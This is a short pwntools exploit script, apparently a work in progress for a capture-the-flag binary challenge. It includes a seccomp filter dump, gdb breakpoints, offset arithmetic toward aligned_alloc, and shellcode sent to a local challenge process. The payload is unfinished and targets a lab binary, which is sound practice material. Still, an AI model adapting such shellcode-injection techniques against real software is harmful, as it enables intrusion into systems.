#!/usr/bin/env python3

from pwn import *

"""
# seccomp-tools dump ../challenge/build/challenge
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000003  if (A == close) goto 0010
 0008: 0x15 0x01 0x00 0x000000ca  if (A == futex) goto 0010
 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL

0x5584957a1000
0x5584957a0000
0x7f39a8001000
"""

context(arch="amd64", os="linux")

# io = process("../challenge/build/challenge")
io = gdb.debug(
    "../challenge/build/challenge",
    """
#pie break 0x00001732
#pie break 0x00001464
pie break 0x00001652
pie break 0x00001449
continue
""",
)

OFFSET_ALIGNED_ALLOC = 0x00001290
OFFSET_RET_SHELLCODE = 0x0000144B
delta_aligned_alloc = -OFFSET_RET_SHELLCODE + OFFSET_ALIGNED_ALLOC

shellcode = """
pop rax
push rax
%s rax, %#x
mov rdi, 0x1000
mov rsi, rdi
call rax
mov rsi, rax
mov rax, 0
mov rdi, 0
mov rdx, 0x1000
""" % (
    "add" if delta_aligned_alloc >= 0 else "sub",
    abs(delta_aligned_alloc),
)
print(shellcode)

shellcode = """
call next
next:
pop rax
"""

payload = asm(shellcode)

io.send(payload)

io.interactive()
